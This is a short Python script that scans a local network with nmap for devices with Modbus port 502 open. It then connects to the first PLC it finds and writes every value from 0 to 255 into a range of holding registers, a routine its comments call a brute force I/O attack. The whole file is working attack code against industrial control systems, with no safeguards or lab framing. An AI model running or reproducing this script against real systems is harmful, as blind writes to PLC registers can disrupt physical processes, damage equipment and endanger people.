import subprocess
import pymodbus
from pymodbus.client import ModbusTcpClient
import time

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Run nmap to scan the network for devices
    result = subprocess.run(['nmap', '-p', '502', '--open', '192.168.1.0/24'], capture_output=True, text=True)
    lines = result.stdout.splitlines()
    
    # Parse the output to find the IP address of the device with port 502 open
    for line in lines:
        if "502/tcp open" in line:
            ip = line.split()[0]
            return ip
    return None

# Function to brute force I/O point values
def brute_force_io(plc_ip, start_address, end_address, step, delay):
    client = ModbusTcpClient(plc_ip)
    
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return
    
    try:
        for address in range(start_address, end_address + 1, step):
            for value in range(0, 256):  # Example range of values to brute force
                # Write the value to the I/O point
                result = client.write_register(address, value)
                if result.isError():
                    print(f"Failed to write to address {address} with value {value}")
                else:
                    print(f"Successfully wrote {value} to address {address}")
                
                # Wait for the specified delay
                time.sleep(delay)
    finally:
        client.close()

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        print("Failed to discover the PLC's IP address")
        return
    
    print(f"PLC found at IP address: {plc_ip}")
    
    # Define the range of I/O points to brute force
    start_address = 0  # Start address of the I/O points
    end_address = 10   # End address of the I/O points
    step = 1           # Step size for the address range
    delay = 0.1        # Delay between each write operation (in seconds)
    
    # Perform the brute force I/O attack
    brute_force_io(plc_ip, start_address, end_address, step, delay)

if __name__ == "__main__":
    main()